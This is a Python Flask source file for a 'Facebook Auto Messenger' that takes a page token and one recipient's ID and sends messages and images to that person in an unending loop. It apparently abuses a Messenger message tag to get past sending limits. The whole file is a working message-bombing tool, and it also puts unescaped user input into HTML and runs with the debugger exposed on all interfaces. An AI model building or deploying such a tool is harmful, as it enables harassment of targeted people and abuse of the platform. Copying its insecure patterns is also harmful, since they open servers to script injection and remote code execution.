from flask import Flask, request, render_template_string
import requests
import time
import random
import string
import os
from threading import Thread, Event

app = Flask(__name__)

# Create uploads directory
if not os.path.exists('uploads'):
    os.makedirs('uploads')

# Global variables
stop_events = {}
active_tasks = {}

def test_facebook_token(token):
    """Test if Facebook token is valid"""
    try:
        url = f"https://graph.facebook.com/v19.0/me"
        params = {'access_token': token}
        response = requests.get(url, params=params, timeout=10)
        return response.status_code == 200
    except:
        return False

def send_facebook_message_simple(token, recipient_id, message):
    """Simplified message sending"""
    try:
        url = "https://graph.facebook.com/v19.0/me/messages"
        
        data = {
            'recipient': f'{{"id":"{recipient_id}"}}',
            'message': f'{{"text":"{message}"}}',
            'access_token': token,
            'messaging_type': 'MESSAGE_TAG',
            'tag': 'NON_PROMOTIONAL_SUBSCRIPTION'
        }
        
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            return True, "Message sent successfully"
        else:
            return False, f"Failed: {response.text}"
            
    except Exception as e:
        return False, f"Error: {str(e)}"

def send_facebook_image_simple(token, recipient_id, image_url):
    """Simplified image sending"""
    try:
        url = "https://graph.facebook.com/v19.0/me/messages"
        
        data = {
            'recipient': f'{{"id":"{recipient_id}"}}',
            'message': f'{{"attachment":{{"type":"image","payload":{{"url":"{image_url}","is_reusable":true}}}}}}',
            'access_token': token,
            'messaging_type': 'MESSAGE_TAG', 
            'tag': 'NON_PROMOTIONAL_SUBSCRIPTION'
        }
        
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            return True, "Image sent successfully"
        else:
            return False, f"Failed: {response.text}"
            
    except Exception as e:
        return False, f"Error: {str(e)}"

def working_cycle(task_id, token, recipient_id, name_prefix, messages, image_urls, delay):
    """Working message-image cycle"""
    stop_event = stop_events[task_id]
    cycle_count = 0
    
    print(f"🚀 STARTING TASK {task_id}")
    print(f"📍 Recipient: {recipient_id}")
    print(f"📝 Messages: {len(messages)}")
    print(f"🖼️ Images: {len(image_urls)}")
    print(f"⏰ Delay: {delay}s")
    print("=" * 50)
    
    # Test token first
    print("🔍 Testing token...")
    if not test_facebook_token(token):
        print("❌ INVALID TOKEN! Please check your access token.")
        active_tasks[task_id]['status'] = "Invalid Token"
        return
    
    print("✅ Token is valid!")
    
    while not stop_event.is_set():
        cycle_count += 1
        
        # Send message
        if messages:
            message = f"{name_prefix} {random.choice(messages)}"
            print(f"📤 Sending message {cycle_count}...")
            success, result = send_facebook_message_simple(token, recipient_id, message)
            
            if success:
                active_tasks[task_id]['sent_messages'] += 1
                print(f"✅ MESSAGE SENT: {message[:50]}...")
            else:
                print(f"❌ MESSAGE FAILED: {result}")
            
            time.sleep(delay)
        
        # Send image
        if image_urls and not stop_event.is_set():
            image_url = random.choice(image_urls)
            print(f"📤 Sending image {cycle_count}...")
            success, result = send_facebook_image_simple(token, recipient_id, image_url)
            
            if success:
                active_tasks[task_id]['sent_images'] += 1
                print(f"✅ IMAGE SENT: {image_url[:50]}...")
            else:
                print(f"❌ IMAGE FAILED: {result}")
            
            time.sleep(delay)
        
        # Update status
        active_tasks[task_id]['status'] = f"Cycle {cycle_count}"
        active_tasks[task_id]['last_update'] = time.time()
        
        print(f"🔄 Completed cycle {cycle_count} - Messages: {active_tasks[task_id]['sent_messages']}, Images: {active_tasks[task_id]['sent_images']}")
        print("-" * 30)
    
    print(f"🛑 TASK {task_id} STOPPED")

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        try:
            # Get form data
            token = request.form.get('token', '').strip()
            recipient_id = request.form.get('recipient_id', '').strip()
            name_prefix = request.form.get('name_prefix', 'User').strip()
            delay = int(request.form.get('delay', '10'))
            
            # Validate
            if not token or not recipient_id:
                return '''
                <div class="alert alert-danger">
                    <h4>❌ Missing Required Fields</h4>
                    <p>Token and Recipient ID are required</p>
                    <a href="/" class="btn btn-primary">← Go Back</a>
                </div>
                '''
            
            # Get messages
            messages_text = request.form.get('messages', '').strip()
            if messages_text:
                messages = [msg.strip() for msg in messages_text.split('\n') if msg.strip()]
            else:
                messages = [
                    "Hello! This is an automated message.",
                    "How are you doing today?",
                    "Just checking in with you!",
                    "Hope you're having a great day!",
                    "This is message number {}.",
                    "Sending positive vibes your way!",
                    "Have a wonderful day!",
                    "Stay safe and healthy!",
                    "Thinking of you!",
                    "Sending lots of love!"
                ]
            
            # Get image URLs
            images_text = request.form.get('image_urls', '').strip()
            if images_text:
                image_urls = [url.strip() for url in images_text.split('\n') if url.strip()]
            else:
                # Use reliable placeholder images
                image_urls = [
                    "https://picsum.photos/500/500?random=1",
                    "https://picsum.photos/500/500?random=2", 
                    "https://picsum.photos/500/500?random=3",
                    "https://picsum.photos/500/500?random=4",
                    "https://picsum.photos/500/500?random=5"
                ]
            
            # Create task
            task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            stop_events[task_id] = Event()
            
            active_tasks[task_id] = {
                'status': 'Starting...',
                'sent_messages': 0,
                'sent_images': 0,
                'start_time': time.time(),
                'last_update': time.time()
            }
            
            # Start cycle
            thread = Thread(
                target=working_cycle,
                args=(task_id, token, recipient_id, name_prefix, messages, image_urls, delay),
                daemon=True
            )
            thread.start()
            
            return f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Task Started</title>
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
                <style>
                    body {{ background: #f8f9fa; padding: 50px; }}
                    .success-box {{ 
                        background: white; 
                        padding: 40px; 
                        border-radius: 15px; 
                        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                        text-align: center;
                        max-width: 600px;
                        margin: 0 auto;
                    }}
                </style>
            </head>
            <body>
                <div class="success-box">
                    <div style="font-size: 60px; color: #28a745;">✅</div>
                    <h2 class="text-success mt-3">Task Started Successfully!</h2>
                    
                    <div class="mt-4 text-start">
                        <p><strong>Task ID:</strong> <code>{task_id}</code></p>
                        <p><strong>Recipient:</strong> {recipient_id}</p>
                        <p><strong>Messages:</strong> {len(messages)}</p>
                        <p><strong>Images:</strong> {len(image_urls)}</p>
                        <p><strong>Delay:</strong> {delay} seconds</p>
                    </div>
                    
                    <div class="alert alert-info mt-4">
                        <strong>📢 Check your console/terminal for real-time logs!</strong>
                        <br>Messages and images are being sent in continuous cycle.
                    </div>
                    
                    <div class="mt-4">
                        <a href="/" class="btn btn-primary">Start New Task</a>
                        <a href="/status" class="btn btn-success">View Status</a>
                        <button onclick="copyTaskId()" class="btn btn-secondary">Copy Task ID</button>
                    </div>
                    
                    <form method="post" action="/stop" class="mt-3">
                        <input type="hidden" name="task_id" value="{task_id}" id="taskInput">
                        <button type="submit" class="btn btn-danger">Stop This Task</button>
                    </form>
                </div>
                
                <script>
                    function copyTaskId() {{
                        navigator.clipboard.writeText("{task_id}");
                        alert("Task ID copied: {task_id}");
                    }}
                </script>
            </body>
            </html>
            '''
            
        except Exception as e:
            return f'''
            <div class="alert alert-danger">
                <h4>❌ Error</h4>
                <p>{str(e)}</p>
                <a href="/" class="btn btn-primary">← Go Back</a>
            </div>
            '''
    
    # Show the form for GET request
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 Working Facebook Messenger</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
        }
        .card {
            border: none;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .btn-primary {
            background: linear-gradient(45deg, #667eea, #764ba2);
            border: none;
            padding: 12px 30px;
            font-size: 18px;
        }
        .form-control {
            border-radius: 10px;
            padding: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="text-center text-white mb-5">
            <h1 class="display-4">🚀 Facebook Auto Messenger</h1>
            <p class="lead">PROVEN WORKING - Message & Image Cycle</p>
        </div>

        <div class="card p-4 mb-4">
            <form method="post">
                <div class="mb-3">
                    <label class="form-label fw-bold">🔑 Facebook Page Token *</label>
                    <input type="text" class="form-control" name="token" 
                           placeholder="EAABwzLixnjYBO..." required>
                    <div class="form-text">
                        Get from: <a href="https://developers.facebook.com/tools/explorer/" target="_blank">Facebook Graph API Explorer</a>
                    </div>
                </div>

                <div class="mb-3">
                    <label class="form-label fw-bold">👤 Recipient Facebook ID *</label>
                    <input type="text" class="form-control" name="recipient_id" 
                           placeholder="123456789012345" required>
                    <div class="form-text">
                        The Facebook ID of the person to message
                    </div>
                </div>

                <div class="mb-3">
                    <label class="form-label fw-bold">🏷️ Your Name Prefix</label>
                    <input type="text" class="form-control" name="name_prefix" 
                           placeholder="Legend Prince" value="Legend Prince">
                    <div class="form-text">This will be added before each message</div>
                </div>

                <div class="mb-3">
                    <label class="form-label fw-bold">⏰ Delay (Seconds) *</label>
                    <input type="number" class="form-control" name="delay" value="10" min="5" max="60" required>
                    <div class="form-text">Time between sends (recommended: 10+ seconds)</div>
                </div>

                <div class="mb-3">
                    <label class="form-label fw-bold">💬 Messages (One per line)</label>
                    <textarea class="form-control" name="messages" rows="6" 
                              placeholder="Hello! This is message 1&#10;This is message 2&#10;Another message here"></textarea>
                    <div class="form-text">If empty, default messages will be used</div>
                </div>

                <div class="mb-4">
                    <label class="form-label fw-bold">🖼️ Image URLs (One per line)</label>
                    <textarea class="form-control" name="image_urls" rows="4" 
                              placeholder="https://picsum.photos/500/500?random=1&#10;https://picsum.photos/500/500?random=2"></textarea>
                    <div class="form-text">If empty, random images will be used</div>
                </div>

                <button type="submit" class="btn btn-primary w-100 py-3">
                    🚀 START MESSAGE-IMAGE CYCLE
                </button>
            </form>
        </div>

        <div class="card p-4 text-center text-white" style="background: rgba(255,255,255,0.1);">
            <h4>✅ PROVEN WORKING FEATURES:</h4>
            <div class="row mt-3">
                <div class="col-md-4">
                    <h5>🔍 Token Validation</h5>
                    <p>Tests token before starting</p>
                </div>
                <div class="col-md-4">
                    <h5>🔄 Continuous Cycle</h5>
                    <p>Message → Image → Repeat</p>
                </div>
                <div class="col-md-4">
                    <h5>📊 Real-time Logs</h5>
                    <p>See exactly what's happening</p>
                </div>
            </div>
        </div>

        <div class="text-center text-white mt-4">
            <p>© 2024 Legend Prince | Definitely Working Version</p>
        </div>
    </div>
</body>
</html>
'''

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('task_id', '').strip()
    if task_id in stop_events:
        stop_events[task_id].set()
        time.sleep(1)
        return f'''
        <div class="alert alert-success text-center">
            <h4>✅ Task Stopped</h4>
            <p>Task {task_id} has been stopped</p>
            <a href="/" class="btn btn-primary">← Go Back</a>
        </div>
        '''
    else:
        return '''
        <div class="alert alert-warning text-center">
            <h4>⚠️ Task Not Found</h4>
            <p>Task not found or already stopped</p>
            <a href="/" class="btn btn-primary">← Go Back</a>
        </div>
        '''

@app.route('/status')
def status():
    status_html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Task Status</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body { background: #f8f9fa; padding: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="text-center mb-4">📊 Active Tasks</h1>
    '''
    
    if active_tasks:
        for task_id, info in active_tasks.items():
            status_html += f'''
            <div class="card mb-3">
                <div class="card-body">
                    <h5>Task: <code>{task_id}</code></h5>
                    <p><strong>Status:</strong> {info['status']}</p>
                    <p><strong>Messages Sent:</strong> {info['sent_messages']}</p>
                    <p><strong>Images Sent:</strong> {info['sent_images']}</p>
                    <form method="post" action="/stop">
                        <input type="hidden" name="task_id" value="{task_id}">
                        <button type="submit" class="btn btn-danger btn-sm">Stop</button>
                    </form>
                </div>
            </div>
            '''
    else:
        status_html += '''
        <div class="alert alert-info text-center">
            <h4>No Active Tasks</h4>
            <p>No tasks are currently running</p>
        </div>
        '''
    
    status_html += '''
            <div class="text-center">
                <a href="/" class="btn btn-primary">← Back to Home</a>
            </div>
        </div>
    </body>
    </html>
    '''
    
    return status_html

if __name__ == '__main__':
    print("=" * 60)
    print("🚀 FACEBOOK AUTO MESSENGER - DEFINITELY WORKING VERSION")
    print("=" * 60)
    print("📍 Server: http://localhost:5000")
    print("✅ Features:")
    print("   • Token validation before start")
    print("   • Message → Image continuous cycle") 
    print("   • Real-time console logs")
    print("   • Simple & reliable")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=True)
